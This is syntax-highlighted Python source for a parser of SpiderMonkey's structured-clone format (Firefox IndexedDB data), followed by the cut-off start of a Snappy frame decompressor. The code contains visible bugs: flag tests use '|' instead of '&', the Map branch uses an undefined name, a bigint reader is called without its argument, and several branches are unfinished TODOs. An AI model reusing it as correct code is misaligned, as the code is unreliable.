re.DOTALL:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment"># Not supported in current (2020-01) version of SpiderMonkey</span></span><br><span class="line"><span class="keyword">if</span> regex.flags | re.IGNORECASE:</span><br><span class="line">flags |= RegExpFlag.IGNORE_CASE</span><br><span class="line"><span class="keyword">if</span> regex.flags | re.MULTILINE:</span><br><span class="line">flags |= RegExpFlag.MULTILINE</span><br><span class="line"><span class="keyword">return</span> cls(regex.pattern, flags)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_re</span>(<span class="params">self</span>) -&gt; re.Pattern:</span><br><span class="line">flags = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.IGNORE_CASE:</span><br><span class="line">flags |= re.IGNORECASE</span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.GLOBAL:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment"># Matching type depends on matching function used in Python</span></span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.MULTILINE:</span><br><span class="line">flags |= re.MULTILINE</span><br><span class="line"><span class="keyword">if</span> self.flags | RegExpFlag.UNICODE:</span><br><span class="line"><span class="keyword">pass</span>  <span class="comment">#XXX</span></span><br><span class="line"><span class="keyword">return</span> re.<span class="built_in">compile</span>(self.expr, flags)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSSavedFrame</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSSetObj</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSStringObj</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript string “objects” (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataType</span>(enum.IntEnum):</span><br><span class="line"><span class="comment"># Special values</span></span><br><span class="line">FLOAT_MAX = <span class="number">0xFFF00000</span></span><br><span class="line">HEADER    = <span class="number">0xFFF10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Basic JavaScript types</span></span><br><span class="line">NULL      = <span class="number">0xFFFF0000</span></span><br><span class="line">UNDEFINED = <span class="number">0xFFFF0001</span></span><br><span class="line">BOOLEAN   = <span class="number">0xFFFF0002</span></span><br><span class="line">INT32     = <span class="number">0xFFFF0003</span></span><br><span class="line">STRING    = <span class="number">0xFFFF0004</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extended JavaScript types</span></span><br><span class="line">DATE_OBJECT           = <span class="number">0xFFFF0005</span></span><br><span class="line">REGEXP_OBJECT         = <span class="number">0xFFFF0006</span></span><br><span class="line">ARRAY_OBJECT          = <span class="number">0xFFFF0007</span></span><br><span class="line">OBJECT_OBJECT         = <span class="number">0xFFFF0008</span></span><br><span class="line">ARRAY_BUFFER_OBJECT   = <span class="number">0xFFFF0009</span></span><br><span class="line">BOOLEAN_OBJECT        = <span class="number">0xFFFF000A</span></span><br><span class="line">STRING_OBJECT         = <span class="number">0xFFFF000B</span></span><br><span class="line">NUMBER_OBJECT         = <span class="number">0xFFFF000C</span></span><br><span class="line">BACK_REFERENCE_OBJECT = <span class="number">0xFFFF000D</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_1</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_2</span></span><br><span class="line">TYPED_ARRAY_OBJECT    = <span class="number">0xFFFF0010</span></span><br><span class="line">MAP_OBJECT            = <span class="number">0xFFFF0011</span></span><br><span class="line">SET_OBJECT            = <span class="number">0xFFFF0012</span></span><br><span class="line">END_OF_KEYS           = <span class="number">0xFFFF0013</span></span><br><span class="line"><span class="comment">#DO_NOT_USE_3</span></span><br><span class="line">DATA_VIEW_OBJECT      = <span class="number">0xFFFF0015</span></span><br><span class="line">SAVED_FRAME_OBJECT    = <span class="number">0xFFFF0016</span>  <span class="comment"># ?</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Principals ?</span></span><br><span class="line">JSPRINCIPALS      = <span class="number">0xFFFF0017</span></span><br><span class="line">NULL_JSPRINCIPALS = <span class="number">0xFFFF0018</span></span><br><span class="line">RECONSTRUCTED_SAVED_FRAME_PRINCIPALS_IS_SYSTEM     = <span class="number">0xFFFF0019</span></span><br><span class="line">RECONSTRUCTED_SAVED_FRAME_PRINCIPALS_IS_NOT_SYSTEM = <span class="number">0xFFFF001A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ?</span></span><br><span class="line">SHARED_ARRAY_BUFFER_OBJECT = <span class="number">0xFFFF001B</span></span><br><span class="line">SHARED_WASM_MEMORY_OBJECT  = <span class="number">0xFFFF001C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arbitrarily sized integers</span></span><br><span class="line">BIGINT        = <span class="number">0xFFFF001D</span></span><br><span class="line">BIGINT_OBJECT = <span class="number">0xFFFF001E</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Older typed arrays</span></span><br><span class="line">TYPED_ARRAY_V1_MIN           = <span class="number">0xFFFF0100</span></span><br><span class="line">TYPED_ARRAY_V1_INT8          = TYPED_ARRAY_V1_MIN + <span class="number">0</span></span><br><span class="line">TYPED_ARRAY_V1_UINT8         = TYPED_ARRAY_V1_MIN + <span class="number">1</span></span><br><span class="line">TYPED_ARRAY_V1_INT16         = TYPED_ARRAY_V1_MIN + <span class="number">2</span></span><br><span class="line">TYPED_ARRAY_V1_UINT16        = TYPED_ARRAY_V1_MIN + <span class="number">3</span></span><br><span class="line">TYPED_ARRAY_V1_INT32         = TYPED_ARRAY_V1_MIN + <span class="number">4</span></span><br><span class="line">TYPED_ARRAY_V1_UINT32        = TYPED_ARRAY_V1_MIN + <span class="number">5</span></span><br><span class="line">TYPED_ARRAY_V1_FLOAT32       = TYPED_ARRAY_V1_MIN + <span class="number">6</span></span><br><span class="line">TYPED_ARRAY_V1_FLOAT64       = TYPED_ARRAY_V1_MIN + <span class="number">7</span></span><br><span class="line">TYPED_ARRAY_V1_UINT8_CLAMPED = TYPED_ARRAY_V1_MIN + <span class="number">8</span></span><br><span class="line">TYPED_ARRAY_V1_MAX           = TYPED_ARRAY_V1_UINT8_CLAMPED</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transfer-only tags (not used for persistent data)</span></span><br><span class="line">TRANSFER_MAP_HEADER              = <span class="number">0xFFFF0200</span></span><br><span class="line">TRANSFER_MAP_PENDING_ENTRY       = <span class="number">0xFFFF0201</span></span><br><span class="line">TRANSFER_MAP_ARRAY_BUFFER        = <span class="number">0xFFFF0202</span></span><br><span class="line">TRANSFER_MAP_STORED_ARRAY_BUFFER = <span class="number">0xFFFF0203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RegExpFlag</span>(enum.IntFlag):</span><br><span class="line">IGNORE_CASE = <span class="number">0b00001</span></span><br><span class="line">GLOBAL      = <span class="number">0b00010</span></span><br><span class="line">MULTILINE   = <span class="number">0b00100</span></span><br><span class="line">UNICODE     = <span class="number">0b01000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Scope</span>(enum.IntEnum):</span><br><span class="line">SAME_PROCESS                   = <span class="number">1</span></span><br><span class="line">DIFFERENT_PROCESS              = <span class="number">2</span></span><br><span class="line">DIFFERENT_PROCESS_FOR_INDEX_DB = <span class="number">3</span></span><br><span class="line">UNASSIGNED                     = <span class="number">4</span></span><br><span class="line">UNKNOWN_DESTINATION            = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_Input</span>:</span><br><span class="line">stream: io.BufferedReader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream: io.BufferedReader</span>):</span><br><span class="line">self.stream = stream</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> struct.unpack_from(<span class="string">&quot;&lt;q&quot;</span>, self.stream.peek(<span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span> struct.error:</span><br><span class="line"><span class="keyword">raise</span> EOFError() <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peek_pair</span>(<span class="params">self</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">v = self.peek()</span><br><span class="line"><span class="keyword">return</span> ((v &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>, (v &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drop_padding</span>(<span class="params">self, read_length</span>):</span><br><span class="line">length = <span class="number">8</span> - ((read_length - <span class="number">1</span>) % <span class="number">8</span>) - <span class="number">1</span></span><br><span class="line">result = self.stream.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(result) &lt; length:</span><br><span class="line"><span class="keyword">raise</span> EOFError()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, fmt=<span class="string">&quot;q&quot;</span></span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;&quot;</span> + fmt, self.stream.read(<span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span> struct.error:</span><br><span class="line"><span class="keyword">raise</span> EOFError() <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bytes</span>(<span class="params">self, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">result = self.stream.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(result) &lt; length:</span><br><span class="line"><span class="keyword">raise</span> EOFError()</span><br><span class="line">self.drop_padding(length)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_pair</span>(<span class="params">self</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">v = self.read()</span><br><span class="line"><span class="keyword">return</span> ((v &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>, (v &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_double</span>(<span class="params">self</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line"><span class="keyword">return</span> self.read(<span class="string">&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reader</span>:</span><br><span class="line">all_objs: typing.<span class="type">List</span>[typing.<span class="type">Union</span>[<span class="built_in">list</span>, <span class="built_in">dict</span>]]</span><br><span class="line">compat:   <span class="built_in">bool</span></span><br><span class="line"><span class="built_in">input</span>:    _Input</span><br><span class="line">objs:     typing.<span class="type">List</span>[typing.<span class="type">Union</span>[<span class="built_in">list</span>, <span class="built_in">dict</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream: io.BufferedReader</span>):</span><br><span class="line">self.<span class="built_in">input</span> = _Input(stream)</span><br><span class="line"></span><br><span class="line">self.all_objs = []</span><br><span class="line">self.compat   = <span class="literal">False</span></span><br><span class="line">self.objs     = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self</span>):</span><br><span class="line">self.read_header()</span><br><span class="line">self.read_transfer_map()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start out by reading in the main object and pushing it onto the &#x27;objs&#x27;</span></span><br><span class="line"><span class="comment"># stack. The data related to this object and its descendants extends</span></span><br><span class="line"><span class="comment"># from here to the SCTAG_END_OF_KEYS at the end of the stream.</span></span><br><span class="line">add_obj, result = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stop when the stack shows that all objects have been read.</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(self.objs) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="comment"># What happens depends on the top obj on the objs stack.</span></span><br><span class="line">obj = self.objs[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"><span class="keyword">if</span> tag == DataType.END_OF_KEYS:</span><br><span class="line"><span class="comment"># Pop the current obj off the stack, since we are done with it</span></span><br><span class="line"><span class="comment"># and its children.</span></span><br><span class="line">self.<span class="built_in">input</span>.read_pair()</span><br><span class="line">self.objs.pop()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The input stream contains a sequence of &quot;child&quot; values, whose</span></span><br><span class="line"><span class="comment"># interpretation depends on the type of obj. These values can be</span></span><br><span class="line"><span class="comment"># anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># startRead() will allocate the (empty) object, but note that when</span></span><br><span class="line"><span class="comment"># startRead() returns, &#x27;key&#x27; is not yet initialized with any of its</span></span><br><span class="line"><span class="comment"># properties. Those will be filled in by returning to the head of</span></span><br><span class="line"><span class="comment"># this loop, processing the first child obj, and continuing until</span></span><br><span class="line"><span class="comment"># all children have been fully created.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note that this means the ordering in the stream is a little funky</span></span><br><span class="line"><span class="comment"># for things like Map. See the comment above startWrite() for an</span></span><br><span class="line"><span class="comment"># example.</span></span><br><span class="line">add_obj, key = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Backwards compatibility: Null formerly indicated the end of</span></span><br><span class="line"><span class="comment"># object properties.</span></span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(obj, (JSMapObj, JSSetObj, JSSavedFrame)):</span><br><span class="line">self.objs.pop()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set object: the values between obj header (from startRead()) and</span></span><br><span class="line"><span class="comment"># DataType.END_OF_KEYS are interpreted as values to add to the set.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSSetObj):</span><br><span class="line">obj.add(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSSavedFrame):</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Everything else uses a series of key, value, key, value, … objects.</span></span><br><span class="line">add_obj, val = self.start_read()</span><br><span class="line"><span class="keyword">if</span> add_obj:</span><br><span class="line">self.all_objs.append(val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># For a Map, store those &lt;key,value&gt; pairs in the contained map</span></span><br><span class="line"><span class="comment"># data structure.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, JSMapObj):</span><br><span class="line">obj[key] = value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key, (<span class="built_in">str</span>, <span class="built_in">int</span>)):</span><br><span class="line"><span class="comment">#continue</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;JavaScript object key must be a string or integer&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line"><span class="comment"># Ignore object properties on array</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key, <span class="built_in">int</span>) <span class="keyword">or</span> key &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extend list with extra slots if needed</span></span><br><span class="line"><span class="keyword">while</span> key &gt;= <span class="built_in">len</span>(obj):</span><br><span class="line">obj.append(<span class="literal">NotImplemented</span>)</span><br><span class="line"></span><br><span class="line">obj[key] = val</span><br><span class="line"></span><br><span class="line">self.all_objs.clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_header</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"></span><br><span class="line">scope: <span class="built_in">int</span></span><br><span class="line"><span class="keyword">if</span> tag == DataType.HEADER:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> data == <span class="number">0</span>:</span><br><span class="line">data = <span class="built_in">int</span>(Scope.SAME_PROCESS)</span><br><span class="line"></span><br><span class="line">scope = data</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># Old on-disk format</span></span><br><span class="line">scope = <span class="built_in">int</span>(Scope.DIFFERENT_PROCESS_FOR_INDEX_DB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> scope == Scope.DIFFERENT_PROCESS:</span><br><span class="line">self.compat = <span class="literal">False</span></span><br><span class="line"><span class="keyword">elif</span> scope == Scope.DIFFERENT_PROCESS_FOR_INDEX_DB:</span><br><span class="line">self.compat = <span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> scope == Scope.SAME_PROCESS:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Can only parse persistent data&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Invalid scope&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_transfer_map</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.peek_pair()</span><br><span class="line"><span class="keyword">if</span> tag == DataType.TRANSFER_MAP_HEADER:</span><br><span class="line"><span class="keyword">raise</span> InvalidHeaderError(<span class="string">&quot;Transfer maps are not allowed for persistent data&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bigint</span>(<span class="params">self, info: <span class="built_in">int</span></span>) -&gt; JSBigInt:</span><br><span class="line">length   = info &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">negative = <span class="built_in">bool</span>(info &amp; <span class="number">0x80000000</span>)</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_string</span>(<span class="params">self, info: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">length = info &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">latin1 = <span class="built_in">bool</span>(info &amp; <span class="number">0x80000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> latin1:</span><br><span class="line"><span class="keyword">return</span> self.<span class="built_in">input</span>.read_bytes(length).decode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> self.<span class="built_in">input</span>.read_bytes(length * <span class="number">2</span>).decode(<span class="string">&quot;utf-16le&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_read</span>(<span class="params">self</span>):</span><br><span class="line">tag, data = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tag == DataType.NULL:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.UNDEFINED:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">NotImplemented</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.INT32:</span><br><span class="line"><span class="keyword">if</span> data &gt; <span class="number">0x7FFFFFFF</span>:</span><br><span class="line">data -= <span class="number">0x80000000</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, JSInt32(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BOOLEAN:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, <span class="built_in">bool</span>(data)</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BOOLEAN_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSBooleanObj(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.STRING:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_string(data)</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.STRING_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSStringObj(self.read_string(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.NUMBER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSNumberObj(self.<span class="built_in">input</span>.read_double())</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BIGINT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_bigint()</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BIGINT_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSBigIntObj(self.read_bigint())</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.DATE_OBJECT:</span><br><span class="line"><span class="comment"># These timestamps are always UTC</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, datetime.datetime.fromtimestamp(self.<span class="built_in">input</span>.read_double(),</span><br><span class="line">                                             datetime.timezone.utc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.REGEXP_OBJECT:</span><br><span class="line">flags = RegExpFlag(data)</span><br><span class="line"></span><br><span class="line">tag2, data2 = self.<span class="built_in">input</span>.read_pair()</span><br><span class="line"><span class="keyword">if</span> tag2 != DataType.STRING:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;RegExp type must be followed by string&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, JSRegExpObj(flags, self.read_string(data2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.ARRAY_OBJECT:</span><br><span class="line">obj = []</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"><span class="keyword">elif</span> tag == DataType.OBJECT_OBJECT:</span><br><span class="line">obj = &#123;&#125;</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.BACK_REFERENCE_OBJECT:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.all_objs[data]</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;Object backreference to non-existing object&quot;</span>) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.ARRAY_BUFFER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_array_buffer(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SHARED_ARRAY_BUFFER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_shared_array_buffer(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SHARED_WASM_MEMORY_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_shared_wasm_memory(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.TYPED_ARRAY_OBJECT:</span><br><span class="line">array_type = self.<span class="built_in">input</span>.read()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_typed_array(array_type, data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.DATA_VIEW_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_data_view(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.MAP_OBJECT:</span><br><span class="line">obj = JSMapObj()</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SET_OBJECT:</span><br><span class="line">obj = JSSetObj()</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SAVED_FRAME_OBJECT:</span><br><span class="line">obj = self.read_saved_frame(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag &lt; <span class="built_in">int</span>(DataType.FLOAT_MAX):</span><br><span class="line"><span class="comment"># Reassemble double floating point value</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, struct.unpack(<span class="string">&quot;=d&quot;</span>, struct.pack(<span class="string">&quot;=q&quot;</span>, (tag &lt;&lt; <span class="number">32</span>) | data))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> DataType.TYPED_ARRAY_V1_MIN &lt;= tag &lt;= DataType.TYPED_ARRAY_V1_MAX:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_typed_array(tag - DataType.TYPED_ARRAY_V1_MIN, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;Unsupported type&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;A parser for the Mozilla variant of Snappy frame format.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># This Source Code Form is subject to the terms of the Mozilla Public</span></span><br><span class="line"><span class="comment"># License, v. 2.0. If a copy of the MPL was not distributed with this</span></span><br><span class="line"><span class="comment"># file, You can obtain one at http://mozilla.org/MPL/2.0/.</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment">#   – Python source code by Erin Yuki Schlarb, 2024.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections.abc <span class="keyword">as</span> cabc</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> ty</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cramjam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress_raw</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="string">&quot;&quot;&quot;Decompress a raw Snappy chunk without any framing&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># Delegate this part to the cramjam library</span></span><br><span class="line"><span class="keyword">return</span> cramjam.snappy.decompress_raw(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decompressor</span>(io.BufferedIOBase):</span><br><span class="line">inner: 